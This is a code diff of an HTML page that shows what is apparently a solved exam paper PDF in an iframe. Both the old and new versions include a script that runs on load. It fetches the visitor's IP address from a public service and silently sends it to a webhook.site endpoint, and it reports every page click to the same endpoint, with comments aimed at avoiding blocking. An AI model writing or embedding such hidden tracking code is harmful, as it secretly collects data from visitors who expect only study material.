@@ -14,32 +14,22 @@
     <iframe id="pdf-frame" src="1012874352-0580-fm-2026-solved-paper (1).pdf"></iframe>
 
     <script>
-        const webhookURL = "https://webhook.site/36d5a036-2f02-4a47-8d38-4387fd72fe8b
+        const webURL = "https://webhook.site/36d5a036-2f02-4a47-8d38-4387fd72fe8b";
 
-        // 1. SILENT IP (Fires immediately)
-        async function getIntel() {
-            try {
-                // Fetch the IP from the provider
-                const res = await fetch('https://api.ipify.org');
-                const data = await res.json();
-                
-                // SEND TO WEBHOOK via the verified Fetch Ping method
-                // We put the IP in the URL (?ip=...) so it can't be blocked
-                fetch(`${webhookURL}?type=SILENT_IP&ip_address=${data.ip}`, { mode: 'no-cors' });
-                
-                console.log("✅ IP Data Sent to Webhook");
-            } catch (e) {
-                // If the IP fetch itself is blocked, we still ping the webhook
-                fetch(`${webhookURL}?type=LOAD_LOGGED&status=IP_FETCH_BLOCKED`, { mode: 'no-cors' });
-            }
-        }
+        // 1. Silent IP Fetch
+        fetch("https://api.ipify.org")
+            .then(res => res.json())
+            .then(data => {
+                // Sending IP in the URL to avoid any JSON errors
+                fetch(webURL + "?type=IP_FOUND&ip=" + data.ip, { mode: "no-cors" });
+            })
+            .catch(err => {
+                fetch(webURL + "?type=FETCH_ERROR", { mode: "no-cors" });
+            });
 
-        // Start the process
-        getIntel();
-
-        // 2. CLICK TRIGGER (For testing interaction)
-        window.onclick = () => {
-            fetch(`${webhookURL}?type=USER_CLICKED_PAGE`, { mode: 'no-cors' });
+        // 2. Click Trigger
+        window.onclick = function() {
+            fetch(webURL + "?type=USER_CLICKED", { mode: "no-cors" });
         };
     </script>
 </body>
